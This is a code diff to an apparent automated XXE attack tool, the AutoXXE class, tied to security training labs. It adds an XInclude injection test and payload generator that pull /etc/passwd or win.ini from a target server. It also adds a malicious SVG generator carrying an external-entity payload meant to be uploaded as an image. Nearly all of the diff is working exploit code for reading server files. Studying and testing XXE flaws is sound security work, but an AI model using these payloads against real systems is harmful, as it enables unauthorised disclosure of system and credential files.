@@ -229,6 +229,48 @@ class AutoXXE:
 
         return {"tested": len(results), "results": results}
 
+    def test_xinclude(self, file_path: str = "/etc/passwd") -> dict:
+        """Test for XInclude injection.
+
+        When you can't control the full XML (no DTD), but can inject into
+        a data value, XInclude lets you read files without defining entities.
+        Lab #71 pattern: inject XInclude in a productId or similar field.
+        """
+        xi_ns = "http://www.w3.org/2001/XInclude"
+        xinclude_payload = (
+            f'<item xmlns:xi="{xi_ns}">'
+            f'<xi:include parse="text" href="file://{file_path}"/>'
+            f'</item>'
+        )
+
+        # Send as XML with XInclude in the data
+        full_xml = f'<?xml version="1.0"?>{xinclude_payload}'
+        result = self._send_xml(full_xml)
+        body = result.get("body", "")
+
+        file_indicators = {
+            "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh"],
+            "/etc/hostname": [],
+            "/c:/windows/win.ini": ["[fonts]", "[extensions]"],
+        }
+        indicators = file_indicators.get(file_path, [])
+        found = (any(ind in body for ind in indicators) if indicators
+                 else len(body) > 10 and "error" not in body.lower()[:100])
+
+        if found:
+            self.vulnerable = True
+            self.xxe_type = "xinclude"
+            self.findings.append({
+                "type": "xxe_xinclude",
+                "technique": "xinclude",
+                "severity": "critical",
+                "file": file_path,
+                "evidence": body[:200],
+            })
+            return {"vulnerable": True, "technique": "xinclude", "evidence": body[:100]}
+
+        return {"vulnerable": False, "technique": "xinclude"}
+
     def test_svg_xxe(self) -> dict:
         """Test XXE via SVG file upload.
 
@@ -332,7 +374,13 @@ class AutoXXE:
             results["blind_xxe"] = blind
             results["steps"].append({"step": "blind_xxe", "result": blind})
 
-        # Step 4: Bypass techniques (if still not found)
+        # Step 4: XInclude (no DTD needed — inject in data values)
+        if not self.vulnerable:
+            xinclude = self.test_xinclude()
+            results["xinclude"] = xinclude
+            results["steps"].append({"step": "xinclude", "result": xinclude})
+
+        # Step 5: Bypass techniques (if still not found)
         if not self.vulnerable:
             bypass = self.test_bypass()
             results["bypass"] = bypass
@@ -344,6 +392,51 @@ class AutoXXE:
         results["elapsed_ms"] = int((time.time() - start) * 1000)
 
         return results
+
+
+def generate_xinclude_payload(file_path: str = "/etc/passwd") -> str:
+    """Generate XInclude payload for apps that don't allow full XML control.
+
+    Lab #71: Can't define DTD, but can inject XInclude in data values.
+
+    Returns payload to use as data value (e.g., productId):
+    <productId xmlns:xi="http://www.w3.org/2001/XInclude">
+      <xi:include parse="text" href="file:///etc/passwd"/>
+    </productId>
+    """
+    xi_ns = "http://www.w3.org/2001/XInclude"
+    return (
+        f'<productId xmlns:xi="{xi_ns}">'
+        f'<xi:include parse="text" href="file://{file_path}"/>'
+        f'</productId>'
+    )
+
+
+def generate_svg_xxe(file_path: str = "/etc/hostname") -> str:
+    """Generate SVG file with XXE payload for image upload.
+
+    Lab #40: SVG is valid XML, can be uploaded as image.
+    Upload this as an image file to trigger XXE on the server.
+    """
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{file_path}">]>\n'
+        '<svg xmlns="http://www.w3.org/2000/svg">\n'
+        '  <text>&xxe;</text>\n'
+        '</svg>'
+    )
+
+
+def test_xinclude_standalone(url: str, param: str = "productId",
+                              method: str = "POST",
+                              file_path: str = "/etc/passwd") -> dict:
+    """Test for XInclude injection as a standalone function.
+
+    Sends XInclude payload as data value and checks if file contents
+    are returned in the response.
+    """
+    engine = AutoXXE(url, param=param, method=method)
+    return engine.test_xinclude(file_path=file_path)
 
 
 def auto_xxe_impl(base_url: str, param: str = "", method: str = "POST",
